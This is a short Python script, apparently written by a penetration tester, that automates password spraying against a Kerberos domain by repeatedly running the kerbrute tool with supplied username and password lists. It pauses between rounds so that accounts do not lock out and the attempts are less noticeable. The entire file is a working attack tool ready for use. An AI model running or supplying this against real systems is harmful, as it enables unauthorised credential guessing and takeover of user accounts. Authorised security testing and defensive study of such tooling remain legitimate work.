import argparse
import os
import shutil
import subprocess
import sys
import time

# This script assumes you have kerbrute in /usr/local/bin/. It used kerbrute to spray a list of passwords, and wait a given amount of time in between each run.
# I made this script to make password spraying more efficient and safer.

parser = argparse.ArgumentParser(description="Password sprayer using Kerbrute.",
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("--users", required=True, help="Path to username list.")
parser.add_argument("--passwords", required=True, help="Path to password list.")
parser.add_argument("--sleep", type=int, default=120, help="Minutes to sleep in between password sprays.")
parser.add_argument("--domain", help="Domain name.")
parser.add_argument("--attempts", default=1, type=int, help="Number of attempts before sleeping.")

args = parser.parse_args()

kerbrute_path = shutil.which("kerbrute")
if not kerbrute_path or not os.access(kerbrute_path, os.X_OK):
    print("Kerbrute is not installed or executable. Install it from https://github.com/ropnop/kerbrute "
          "or update this script to call the program from a custom path.")
    sys.exit(1)

p = args.passwords
s = args.sleep
u = args.users
d = args.domain
a = args.attempts
minutes = s*60
i = 0

with open (p) as passwords:
     while (password := passwords.readline().rstrip()):
        subprocess.run([kerbrute_path, "passwordspray" , "-d", d, u , password], check=True)
        i += 1
        if i == a:
            i = 0
            print("sleeping for", s,  "minute(s)")
            sys.stdout.flush()
            time.sleep(minutes)
